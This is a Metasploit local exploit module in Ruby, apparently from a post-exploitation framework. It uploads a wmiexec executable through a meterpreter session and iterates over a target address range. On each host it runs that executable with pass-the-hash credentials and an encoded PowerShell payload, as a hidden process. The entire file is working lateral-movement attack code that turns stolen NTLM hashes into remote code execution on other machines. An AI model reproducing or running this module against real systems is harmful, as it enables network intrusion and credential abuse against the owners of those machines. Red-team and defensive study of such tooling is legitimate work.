##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  include Msf::Exploit::Powershell
  include Msf::Post::Windows::WMIC

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Wmi with wmiexec(hash)',
                      'Description'   => %q{Push a file and execute it.},
                      'Author'        => 'viper',
                      'License'       => MSF_LICENSE,
                      'Platform'      => ['win', 'linux',],
                      'SessionTypes'  => ['meterpreter'],
                      'Targets'       =>
                              [
                                      ['Automatic', {'Arch' => [ARCH_X86, ARCH_X64]}],
                              ],
                      'DefaultTarget' => 0
          ))

    register_options([
                             OptAddressRange.new("RHOSTS", [true, "Target address range or CIDR identifier"]),
                             OptString.new('LPATH', [true, 'Local file path to upload and execute', "dswmiexec.exe"]),
                             OptInt.new('TIMEOUT', [true, 'Timeout for command execution', 10])
                     ])
    deregister_options("RHOST")
  end

  def exploit

    if session.type == "shell"
      pub_json_result(false,
                      "Unsupport shell type",
                      nil,
                      self.uuid)
      return
    end
    if File.file?(File.join(Msf::Config.install_root, "scripts", "pe", datastore['LPATH']))
      script_path = File.join(Msf::Config.install_root, "scripts", "pe", datastore['LPATH'])
    elsif File.file?(datastore['LPATH'])
      script_path = datastore['LPATH']
    else
      pub_json_result(false,
                      "#{datastore['LPATH']} not found",
                      nil,
                      self.uuid)
      return
    end

    filename = '/' + datastore['LPATH']
    tmprpath = get_env('TEMP') + filename
    if client.fs.file.exist? tmprpath
      vprint_status("#{tmprpath} Already Uploaded")
    else
      vprint_status("Uploading #{script_path} to #{tmprpath}")
      upload_file(tmprpath, script_path)
    end


    if session.platform == 'windows'
      # Don't use cmd.exe /c start so we can fetch output
      cmd = tmprpath
    else
      # Set 700 so only we can execute the file
      chmod(tmprpath, 0700)
      # Handle absolute paths
      cmd = tmprpath.start_with?('/') ? tmprpath : "./#{tmprpath}"
    end

    data = []
    begin
      Rex::Socket::RangeWalker.new(datastore["RHOSTS"]).each do |server|
        arg = wmic_args_string(server)
        vprint_status("Executing command: #{cmd} #{arg}")
        pid = cmd_exec_hod(cmd, arg, datastore['TIMEOUT'])
        data.push({:server => server,
                   :flag   => {pid: pid}})
      end
    rescue ::Exception => e
      pub_json_result(false,
                      e,
                      nil,
                      self.uuid)
    end
    pub_json_result(true,
                    nil,
                    data,
                    self.uuid)

  end


  def wmic_args_string(host, domain = datastore['SMBDomain'], user = datastore['SMBUser'], pass = datastore['SMBPass'])
    if load_extapi
      psh_options = {:remove_comspec       => true,
                     :encode_final_payload => true}
    else
      psh_options = {:remove_comspec       => true,
                     :encode_inner_payload => true,
                     :wrap_double_quotes   => true}
    end
    psh = cmd_psh_payload(payload.encoded,
                          payload_instance.arch.first,
                          psh_options)

    userpass = ""
    unless user.nil?
      if domain.nil?
        userpass = "-hashes #{pass} #{user}@#{host} \"#{psh}\""
      else
        userpass = "-hashes #{pass} #{domain}/#{user}@#{host} \"#{psh}\""
      end
    end
    return userpass
  end
  def cmd_exec_hod(cmd, args=nil, time_out=15)
    case session.type
    when /meterpreter/
      if args.nil? and cmd =~ /[^a-zA-Z0-9\/._-]/
        args = ""
      end
      session.response_timeout = time_out
      process = session.sys.process.execute(cmd, args, {'Hidden' => true })
      sleep(time_out)
      process.pid
      process.close
      vprint_status("Pid: #{process.pid}")

    else
      print_error "cmd_exec_get_pid is incompatible with non-meterpreter sessions"
    end
  end
end
